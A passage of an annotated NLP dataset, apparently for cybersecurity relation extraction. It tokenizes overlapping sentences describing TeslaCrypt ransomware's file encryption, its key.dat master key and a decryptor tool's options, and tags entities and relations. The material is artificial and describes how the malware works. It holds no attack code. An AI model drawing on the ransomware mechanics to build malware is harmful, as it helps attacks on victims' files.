[182, 182], "name": "target fileinitializes", "pos": [16, 18], "index": "21_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [193, 193], "name": "AES context data", "pos": [27, 30], "index": "22_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [205, 205], "name": "AES CBC 256-bit", "pos": [39, 42], "index": "23_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [213, 213], "name": "EncryptWithCbcAes", "pos": [47, 48], "index": "24_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [219, 219], "name": "process", "pos": [2, 3], "index": "25_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [224, 224], "name": "new encrypted file", "pos": [7, 10], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [269, 269], "name": "It", "pos": [0, 1], "index": "27_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [273, 273], "name": "key.dat", "pos": [4, 5], "index": "28_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [280, 280], "name": "master key", "pos": [11, 13], "index": "29_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "UK", "evidence": [1], "h": 4, "t": 6}, {"r": "UK", "evidence": [1], "h": 8, "t": 9}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 11}, {"r": "FR", "evidence": [2], "t": 10, "h": 11}, {"r": "ST", "evidence": [2], "h": 11, "t": 12}, {"r": "WR", "evidence": [2], "h": 11, "t": 13}, {"r": "RD", "evidence": [3], "h": 14, "t": 15}, {"r": "WR", "evidence": [3], "h": 14, "t": 16}, {"r": "RD", "evidence": [3], "h": 14, "t": 17}, {"r": "CO", "evidence": [3, 4], "h": 14, "t": 18}, {"r": "CO", "evidence": [3, 4, 5], "h": 14, "t": 25}, {"r": "WR", "evidence": [4], "h": 18, "t": 19}, {"r": "EX", "evidence": [4], "h": 18, "t": 20}, {"r": "RD", "evidence": [4], "h": 18, "t": 21}, {"r": "WR", "evidence": [4], "h": 18, "t": 22}, {"r": "WR", "evidence": [4], "h": 18, "t": 23}, {"r": "EX", "evidence": [4], "h": 18, "t": 24}, {"r": "WR", "evidence": [5], "h": 25, "t": 26}, {"r": "RD", "evidence": [7], "h": 27, "t": 28}, {"r": "WR", "evidence": [7], "h": 27, "t": 29}]}, {"title": "663-24", "sents": [["It", "does", "this", "to", "achieve", "a", "particular", "goal", ":", "if", "the", "victim", "workstation", "is", "offline", "or", "if", "a", "firewall", "blocks", "the", "communication", "with", "the", "C", "&", "C", "server", ",", "the", "dropper", "will", "proceed", "with", "the", "destruction", "of", "the", "master", "key", "inside", "the", "``", "key.dat", "''", "file", ",", "after", "the", "encryption", "of", "all", "files", "has", "been", "completed", "."], ["To", "recover", "the", "files", ",", "the", "user", "would", "have", "to", "connect", "to", "the", "threat", "actor", "'", "s", "TOR", "website", "and", "provide", "the", "recovery", "key", "."], ["The", "code", "for", "the", "encryption", "thread", "takes", "the", "shifted", "master", "key", ",", "calculates", "its", "SHA256", "hash", "and", "starts", "to", "enumerate", "all", "files", "of", "the", "victim", "workstation", "(", "filtering", "by", "extension", "type", ",", "Tesla", "Crypt", "supports", "over", "170", "different", "file", "extensions", ")", "."], ["It", ":", "generates", "a", "16-bytes", "Initialization", "Vector", "for", "AES", ",", "using", "the", "GetAndHashOsData", "API", "functionreads", "the", "target", "fileinitializes", "the", "AES", "encryption", "algorithm", "through", "the", "creation", "of", "the", "AES", "context", "data", "structurefinally", "encrypts", "the", "contents", "of", "the", "file", "using", "an", "AES", "CBC", "256-bit", "algorithm", "implemented", "in", "the", "``", "EncryptWithCbcAes", "''", "function", "."], ["When", "the", "process", "is", "complete", ",", "the", "new", "encrypted", "file", "is", "created", "."], ["The", "new", "file", "contains", "a", "small", "header", "(", "composed", "of", "the", "AES", "Initialization", "Vector", "in", "its", "first", "16", "bytes", "followed", "by", "the", "original", "file", "size", "in", "the", "next", "4", "bytes", ")", ",", "and", "then", "the", "actual", "encrypted", "bytes", "."], ["It", "needs", "the", "``", "key.dat", "''", "file", "to", "properly", "recover", "the", "master", "key", "used", "for", "file", "encryption", "."], ["Before", "it", "begins", "execution", ",", "it", "searches", "for", "``", "key.dat", "''", "in", "its", "original", "location", "(", "the", "user", "'", "s", "Application", "Data", "directory", ")", ",", "or", "in", "the", "current", "directory", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [11, 11], "name": "victim", "pos": [11, 12], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [18, 18], "name": "firewall", "pos": [18, 19], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [21, 21], "name": "communication", "pos": [21, 22], "index": "2_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [24, 24], "name": "C & C server", "pos": [24, 28], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [30, 30], "name": "dropper", "pos": [30, 31], "index": "4_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [43, 43], "name": "key.dat", "pos": [43, 44], "index": "5_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [58, 58], "name": "recover the files", "pos": [1, 4], "index": "6_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [63, 63], "name": "user", "pos": [6, 7], "index": "7_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [74, 74], "name": "TOR website", "pos": [17, 19], "index": "8_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [79, 79], "name": "recovery key", "pos": [22, 24], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [86, 86], "name": "encryption thread", "pos": [4, 6], "index": "10_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [90, 90], "name": "shifted master key", "pos": [8, 11], "index": "11_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [96, 96], "name": "SHA256 hash", "pos": [14, 16], "index": "12_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [103, 103], "name": "files of the victim", "pos": [21, 25], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [124, 124], "name": "It", "pos": [0, 1], "index": "14_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [129, 129], "name": "Initialization Vector", "pos": [5, 7], "index": "15_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [136, 136], "name": "GetAndHashOsData API", "pos": [12, 14], "index": "16_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [140, 140], "name": "target fileinitializes", "pos": [16, 18], "index": "17_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [151, 151], "name": "AES context data", "pos": [27, 30], "index": "18_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [163, 163], "name": "AES CBC 256-bit", "pos": [39, 42], "index": "19_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [171, 171], "name": "EncryptWithCbcAes", "pos": [47, 48], "index": "20_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [177, 177], "name": "process", "pos": [2, 3], "index": "21_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [182, 182], "name": "new encrypted file", "pos": [7, 10], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [227, 227], "name": "It", "pos": [0, 1], "index": "23_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [231, 231], "name": "key.dat", "pos": [4, 5], "index": "24_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [238, 238], "name": "master key", "pos": [11, 13], "index": "25_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [246, 246], "name": "it", "pos": [1, 2], "index": "26_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [254, 254], "name": "key.dat", "pos": [9, 10], "index": "27_0"}]], "labels": [{"r": "UK", "evidence": [0], "h": 0, "t": 2}, {"r": "UK", "evidence": [0], "h": 4, "t": 5}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 7}, {"r": "FR", "evidence": [1], "t": 6, "h": 7}, {"r": "ST", "evidence": [1], "h": 7, "t": 8}, {"r": "WR", "evidence": [1], "h": 7, "t": 9}, {"r": "RD", "evidence": [2], "h": 10, "t": 11}, {"r": "WR", "evidence": [2], "h": 10, "t": 12}, {"r": "RD", "evidence": [2], "h": 10, "t": 13}, {"r": "CO", "evidence": [2, 3], "h": 10, "t": 14}, {"r": "CO", "evidence": [2, 3, 4], "h": 10, "t": 21}, {"r": "WR", "evidence": [3], "h": 14, "t": 15}, {"r": "EX", "evidence": [3], "h": 14, "t": 16}, {"r": "RD", "evidence": [3], "h": 14, "t": 17}, {"r": "WR", "evidence": [3], "h": 14, "t": 18}, {"r": "WR", "evidence": [3], "h": 14, "t": 19}, {"r": "EX", "evidence": [3], "h": 14, "t": 20}, {"r": "WR", "evidence": [4], "h": 21, "t": 22}, {"r": "RD", "evidence": [6], "h": 23, "t": 24}, {"r": "WR", "evidence": [6], "h": 23, "t": 25}, {"r": "CO", "evidence": [6, 7], "h": 23, "t": 26}, {"r": "CO", "evidence": [6, 7], "t": 24, "h": 27}]}, {"title": "663-25", "sents": [["To", "recover", "the", "files", ",", "the", "user", "would", "have", "to", "connect", "to", "the", "threat", "actor", "'", "s", "TOR", "website", "and", "provide", "the", "recovery", "key", "."], ["The", "code", "for", "the", "encryption", "thread", "takes", "the", "shifted", "master", "key", ",", "calculates", "its", "SHA256", "hash", "and", "starts", "to", "enumerate", "all", "files", "of", "the", "victim", "workstation", "(", "filtering", "by", "extension", "type", ",", "Tesla", "Crypt", "supports", "over", "170", "different", "file", "extensions", ")", "."], ["It", ":", "generates", "a", "16-bytes", "Initialization", "Vector", "for", "AES", ",", "using", "the", "GetAndHashOsData", "API", "functionreads", "the", "target", "fileinitializes", "the", "AES", "encryption", "algorithm", "through", "the", "creation", "of", "the", "AES", "context", "data", "structurefinally", "encrypts", "the", "contents", "of", "the", "file", "using", "an", "AES", "CBC", "256-bit", "algorithm", "implemented", "in", "the", "``", "EncryptWithCbcAes", "''", "function", "."], ["When", "the", "process", "is", "complete", ",", "the", "new", "encrypted", "file", "is", "created", "."], ["The", "new", "file", "contains", "a", "small", "header", "(", "composed", "of", "the", "AES", "Initialization", "Vector", "in", "its", "first", "16", "bytes", "followed", "by", "the", "original", "file", "size", "in", "the", "next", "4", "bytes", ")", ",", "and", "then", "the", "actual", "encrypted", "bytes", "."], ["It", "needs", "the", "``", "key.dat", "''", "file", "to", "properly", "recover", "the", "master", "key", "used", "for", "file", "encryption", "."], ["Before", "it", "begins", "execution", ",", "it", "searches", "for", "``", "key.dat", "''", "in", "its", "original", "location", "(", "the", "user", "'", "s", "Application", "Data", "directory", ")", ",", "or", "in", "the", "current", "directory", "."], ["If", "it", "isn", "'", "t", "able", "to", "find", "and", "correctly", "parse", "the", "``", "key.dat", "''", "file", ",", "it", "will", "return", "an", "error", "and", "exit", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [1, 1], "name": "recover the files", "pos": [1, 4], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [6, 6], "name": "user", "pos": [6, 7], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [17, 17], "name": "TOR website", "pos": [17, 19], "index": "2_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [22, 22], "name": "recovery key", "pos": [22, 24], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "encryption thread", "pos": [4, 6], "index": "4_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [33, 33], "name": "shifted master key", "pos": [8, 11], "index": "5_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [39, 39], "name": "SHA256 hash", "pos": [14, 16], "index": "6_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [46, 46], "name": "files of the victim", "pos": [21, 25], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [67, 67], "name": "It", "pos": [0, 1], "index": "8_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [72, 72], "name": "Initialization Vector", "pos": [5, 7], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [79, 79], "name": "GetAndHashOsData API", "pos": [12, 14], "index": "10_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [83, 83], "name": "target fileinitializes", "pos": [16, 18], "index": "11_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [94, 94], "name": "AES context data", "pos": [27, 30], "index": "12_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [106, 106], "name": "AES CBC 256-bit", "pos": [39, 42], "index": "13_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [114, 114], "name": "EncryptWithCbcAes", "pos": [47, 48], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [120, 120], "name": "process", "pos": [2, 3], "index": "15_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [125, 125], "name": "new encrypted file", "pos": [7, 10], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [170, 170], "name": "It", "pos": [0, 1], "index": "17_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [174, 174], "name": "key.dat", "pos": [4, 5], "index": "18_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [181, 181], "name": "master key", "pos": [11, 13], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [189, 189], "name": "it", "pos": [1, 2], "index": "20_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [197, 197], "name": "key.dat", "pos": [9, 10], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [220, 220], "name": "it", "pos": [1, 2], "index": "22_0"}]], "labels": [{"r": "FR", "evidence": [0], "t": 0, "h": 1}, {"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [0], "h": 1, "t": 3}, {"r": "RD", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 4, "t": 6}, {"r": "RD", "evidence": [1], "h": 4, "t": 7}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 8}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 15}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "EX", "evidence": [2], "h": 8, "t": 10}, {"r": "RD", "evidence": [2], "h": 8, "t": 11}, {"r": "WR", "evidence": [2], "h": 8, "t": 12}, {"r": "WR", "evidence": [2], "h": 8, "t": 13}, {"r": "EX", "evidence": [2], "h": 8, "t": 14}, {"r": "WR", "evidence": [3], "h": 15, "t": 16}, {"r": "RD", "evidence": [5], "h": 17, "t": 18}, {"r": "WR", "evidence": [5], "h": 17, "t": 19}, {"r": "CO", "evidence": [5, 6], "h": 17, "t": 20}, {"r": "CO", "evidence": [5, 6, 7], "h": 17, "t": 22}, {"r": "CO", "evidence": [5, 6], "t": 18, "h": 21}]}, {"title": "663-26", "sents": [["The", "code", "for", "the", "encryption", "thread", "takes", "the", "shifted", "master", "key", ",", "calculates", "its", "SHA256", "hash", "and", "starts", "to", "enumerate", "all", "files", "of", "the", "victim", "workstation", "(", "filtering", "by", "extension", "type", ",", "Tesla", "Crypt", "supports", "over", "170", "different", "file", "extensions", ")", "."], ["It", ":", "generates", "a", "16-bytes", "Initialization", "Vector", "for", "AES", ",", "using", "the", "GetAndHashOsData", "API", "functionreads", "the", "target", "fileinitializes", "the", "AES", "encryption", "algorithm", "through", "the", "creation", "of", "the", "AES", "context", "data", "structurefinally", "encrypts", "the", "contents", "of", "the", "file", "using", "an", "AES", "CBC", "256-bit", "algorithm", "implemented", "in", "the", "``", "EncryptWithCbcAes", "''", "function", "."], ["When", "the", "process", "is", "complete", ",", "the", "new", "encrypted", "file", "is", "created", "."], ["The", "new", "file", "contains", "a", "small", "header", "(", "composed", "of", "the", "AES", "Initialization", "Vector", "in", "its", "first", "16", "bytes", "followed", "by", "the", "original", "file", "size", "in", "the", "next", "4", "bytes", ")", ",", "and", "then", "the", "actual", "encrypted", "bytes", "."], ["It", "needs", "the", "``", "key.dat", "''", "file", "to", "properly", "recover", "the", "master", "key", "used", "for", "file", "encryption", "."], ["Before", "it", "begins", "execution", ",", "it", "searches", "for", "``", "key.dat", "''", "in", "its", "original", "location", "(", "the", "user", "'", "s", "Application", "Data", "directory", ")", ",", "or", "in", "the", "current", "directory", "."], ["If", "it", "isn", "'", "t", "able", "to", "find", "and", "correctly", "parse", "the", "``", "key.dat", "''", "file", ",", "it", "will", "return", "an", "error", "and", "exit", "."], ["To", "use", "this", "tool", ",", "just", "copy", "the", "``", "key.dat", "''", "file", "into", "the", "tool", "'", "s", "directory", "and", "then", "specify", "either", "the", "encrypted", "file", "or", "a", "directory", "containing", "encrypted", "files", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "encryption thread", "pos": [4, 6], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [8, 8], "name": "shifted master key", "pos": [8, 11], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [14, 14], "name": "SHA256 hash", "pos": [14, 16], "index": "2_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [21, 21], "name": "files of the victim", "pos": [21, 25], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [42, 42], "name": "It", "pos": [0, 1], "index": "4_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [47, 47], "name": "Initialization Vector", "pos": [5, 7], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [54, 54], "name": "GetAndHashOsData API", "pos": [12, 14], "index": "6_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [58, 58], "name": "target fileinitializes", "pos": [16, 18], "index": "7_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [69, 69], "name": "AES context data", "pos": [27, 30], "index": "8_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [81, 81], "name": "AES CBC 256-bit", "pos": [39, 42], "index": "9_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [89, 89], "name": "EncryptWithCbcAes", "pos": [47, 48], "index": "10_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [95, 95], "name": "process", "pos": [2, 3], "index": "11_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [100, 100], "name": "new encrypted file", "pos": [7, 10], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [145, 145], "name": "It", "pos": [0, 1], "index": "13_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [149, 149], "name": "key.dat", "pos": [4, 5], "index": "14_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [156, 156], "name": "master key", "pos": [11, 13], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [164, 164], "name": "it", "pos": [1, 2], "index": "16_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [172, 172], "name": "key.dat", "pos": [9, 10], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [195, 195], "name": "it", "pos": [1, 2], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [222, 222], "name": "tool", "pos": [3, 4], "index": "19_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [228, 228], "name": "key.dat", "pos": [9, 10], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [233, 233], "name": "tool ' s directory", "pos": [14, 18], "index": "21_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "h": 0, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "CO", "evidence": [0, 1, 2], "h": 0, "t": 11}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "EX", "evidence": [1], "h": 4, "t": 6}, {"r": "RD", "evidence": [1], "h": 4, "t": 7}, {"r": "WR", "evidence": [1], "h": 4, "t": 8}, {"r": "WR", "evidence": [1], "h": 4, "t": 9}, {"r": "EX", "evidence": [1], "h": 4, "t": 10}, {"r": "WR", "evidence": [2], "h": 11, "t": 12}, {"r": "RD", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [4], "h": 13, "t": 15}, {"r": "CO", "evidence": [4, 5], "h": 13, "t": 16}, {"r": "CO", "evidence": [4, 5, 6], "h": 13, "t": 18}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 13, "t": 19}, {"r": "CO", "evidence": [5, 6, 7], "h": 17, "t": 20}, {"r": "CO", "evidence": [4, 5], "t": 14, "h": 17}, {"r": "WR", "evidence": [7], "h": 19, "t": 20}, {"r": "RD", "evidence": [7], "h": 19, "t": 21}]}, {"title": "663-27", "sents": [["It", ":", "generates", "a", "16-bytes", "Initialization", "Vector", "for", "AES", ",", "using", "the", "GetAndHashOsData", "API", "functionreads", "the", "target", "fileinitializes", "the", "AES", "encryption", "algorithm", "through", "the", "creation", "of", "the", "AES", "context", "data", "structurefinally", "encrypts", "the", "contents", "of", "the", "file", "using", "an", "AES", "CBC", "256-bit", "algorithm", "implemented", "in", "the", "``", "EncryptWithCbcAes", "''", "function", "."], ["When", "the", "process", "is", "complete", ",", "the", "new", "encrypted", "file", "is", "created", "."], ["The", "new", "file", "contains", "a", "small", "header", "(", "composed", "of", "the", "AES", "Initialization", "Vector", "in", "its", "first", "16", "bytes", "followed", "by", "the", "original", "file", "size", "in", "the", "next", "4", "bytes", ")", ",", "and", "then", "the", "actual", "encrypted", "bytes", "."], ["It", "needs", "the", "``", "key.dat", "''", "file", "to", "properly", "recover", "the", "master", "key", "used", "for", "file", "encryption", "."], ["Before", "it", "begins", "execution", ",", "it", "searches", "for", "``", "key.dat", "''", "in", "its", "original", "location", "(", "the", "user", "'", "s", "Application", "Data", "directory", ")", ",", "or", "in", "the", "current", "directory", "."], ["If", "it", "isn", "'", "t", "able", "to", "find", "and", "correctly", "parse", "the", "``", "key.dat", "''", "file", ",", "it", "will", "return", "an", "error", "and", "exit", "."], ["To", "use", "this", "tool", ",", "just", "copy", "the", "``", "key.dat", "''", "file", "into", "the", "tool", "'", "s", "directory", "and", "then", "specify", "either", "the", "encrypted", "file", "or", "a", "directory", "containing", "encrypted", "files", "."], ["Here", "is", "the", "list", "of", "command", "line", "options", ":", "/help", "-", "Show", "the", "help", "message/key", "-", "Manually", "specify", "the", "master", "key", "for", "the", "decryption", "(", "32", "bytes/64", "digits", ")", "/keyfile", "-", "Specify", "the", "path", "of", "the", "``", "key.dat", "''", "file", "used", "to", "recover", "the", "master", "key", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [5, 5], "name": "Initialization Vector", "pos": [5, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "GetAndHashOsData API", "pos": [12, 14], "index": "2_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [16, 16], "name": "target fileinitializes", "pos": [16, 18], "index": "3_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [27, 27], "name": "AES context data", "pos": [27, 30], "index": "4_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [39, 39], "name": "AES CBC 256-bit", "pos": [39, 42], "index": "5_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [47, 47], "name": "EncryptWithCbcAes", "pos": [47, 48], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [53, 53], "name": "process", "pos": [2, 3], "index": "7_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [58, 58], "name": "new encrypted file", "pos": [7, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [103, 103], "name": "It", "pos": [0, 1], "index": "9_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [107, 107], "name": "key.dat", "pos": [4, 5], "index": "10_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [114, 114], "name": "master key", "pos": [11, 13], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [122, 122], "name": "it", "pos": [1, 2], "index": "12_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [130, 130], "name": "key.dat", "pos": [9, 10], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [153, 153], "name": "it", "pos": [1, 2], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [180, 180], "name": "tool", "pos": [3, 4], "index": "15_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [186, 186], "name": "key.dat", "pos": [9, 10], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [191, 191], "name": "tool ' s directory", "pos": [14, 18], "index": "17_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 0, "t": 2}, {"r": "RD", "evidence": [0], "h": 0, "t": 3}, {"r": "WR", "evidence": [0], "h": 0, "t": 4}, {"r": "WR", "evidence": [0], "h": 0, "t": 5}, {"r": "EX", "evidence": [0], "h": 0, "t": 6}, {"r": "WR", "evidence": [1], "h": 7, "t": 8}, {"r": "RD", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 9, "t": 11}, {"r": "CO", "evidence": [3, 4], "h": 9, "t": 12}, {"r": "CO", "evidence": [3, 4, 5], "h": 9, "t": 14}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 9, "t": 15}, {"r": "CO", "evidence": [4, 5, 6], "h": 13, "t": 16}, {"r": "CO", "evidence": [3, 4], "t": 10, "h": 13}, {"r": "WR", "evidence": [6], "h": 15, "t": 16}, {"r": "RD", "evidence": [6], "h": 15, "t": 17}]}, {"title": "663-28", "sents": [["When", "the", "process", "is", "complete", ",", "the", "new", "encrypted", "file", "is", "created", "."], ["The", "new", "file", "contains", "a", "small", "header", "(", "composed", "of", "the", "AES", "Initialization", "Vector", "in", "its", "first", "16", "bytes", "followed", "by", "the", "original", "file", "size", "in", "the", "next", "4", "bytes", ")", ",", "and", "then", "the", "actual", "encrypted", "bytes", "."], ["It", "needs", "the", "``", "key.dat", "''", "file", "to", "properly", "recover", "the", "master", "key", "used", "for", "file", "encryption", "."], ["Before", "it", "begins", "execution", ",", "it", "searches", "for", "``", "key.dat", "''", "in", "its", "original", "location", "(", "the", "user", "'", "s", "Application", "Data", "directory", ")", ",", "or", "in", "the", "current", "directory", "."], ["If", "it", "isn", "'", "t", "able", "to", "find", "and", "correctly", "parse", "the", "``", "key.dat", "''", "file", ",", "it", "will", "return", "an", "error", "and", "exit", "."], ["To", "use", "this", "tool", ",", "just", "copy", "the", "``", "key.dat", "''", "file", "into", "the", "tool", "'", "s", "directory", "and", "then", "specify", "either", "the", "encrypted", "file", "or", "a", "directory", "containing", "encrypted", "files", "."], ["Here", "is", "the", "list", "of", "command", "line", "options", ":", "/help", "-", "Show", "the", "help", "message/key", "-", "Manually", "specify", "the", "master", "key", "for", "the", "decryption", "(", "32", "bytes/64", "digits", ")", "/keyfile", "-", "Specify", "the", "path", "of", "the", "``", "key.dat", "''", "file", "used", "to", "recover", "the", "master", "key", "."], ["/file", "-", "Decrypt", "an", "encrypted", "file/dir", "-", "Decrypt", "all", "the", "``", ".ecc", "''", "files", "in", "the", "target", "directory", "and", "its", "subdirs/scanEntirePc", "-", "Decrypt", "``", ".ecc", "''", "files", "on", "the", "entire", "computer/KeepOriginal", "-", "Keep", "the", "original", "file", "(", "s", ")", "in", "the", "encryption", "process/deleteTeslaCrypt", "-", "Automatically", "kill", "and", "delete", "the", "TeslaCrypt", "dropper", "(", "if", "found", "active", "in", "the", "target", "system", ")", "Back", "up", "your", "encrypted", "files", "before", "you", "use", "this", "utility", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "process", "pos": [2, 3], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [7, 7], "name": "new encrypted file", "pos": [7, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [52, 52], "name": "It", "pos": [0, 1], "index": "2_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [56, 56], "name": "key.dat", "pos": [4, 5], "index": "3_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [63, 63], "name": "master key", "pos": [11, 13], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [71, 71], "name": "it", "pos": [1, 2], "index": "5_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [79, 79], "name": "key.dat", "pos": [9, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [102, 102], "name": "it", "pos": [1, 2], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [129, 129], "name": "tool", "pos": [3, 4], "index": "8_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [135, 135], "name": "key.dat", "pos": [9, 10], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [140, 140], "name": "tool ' s directory", "pos": [14, 18], "index": "10_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [2], "h": 2, "t": 3}, {"r": "WR", "evidence": [2], "h": 2, "t": 4}, {"r": "CO", "evidence": [2, 3], "h": 2, "t": 5}, {"r": "CO", "evidence": [2, 3, 4], "h": 2, "t": 7}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 2, "t": 8}, {"r": "CO", "evidence": [3, 4, 5], "h": 6, "t": 9}, {"r": "CO", "evidence": [2, 3], "t": 3, "h": 6}, {"r": "WR", "evidence": [5], "h": 8, "t": 9}, {"r": "RD", "evidence": [5], "h": 8, "t": 10}]}, {"title": "663-29", "sents": [["The", "new", "file", "contains", "a", "small", "header", "(", "composed", "of", "the", "AES", "Initialization", "Vector", "in", "its", "first", "16", "bytes", "followed", "by", "the", "original", "file", "size", "in", "the", "next", "4", "bytes", ")", ",", "and", "then", "the", "actual", "encrypted", "bytes", "."], ["It", "needs", "the", "``", "key.dat", 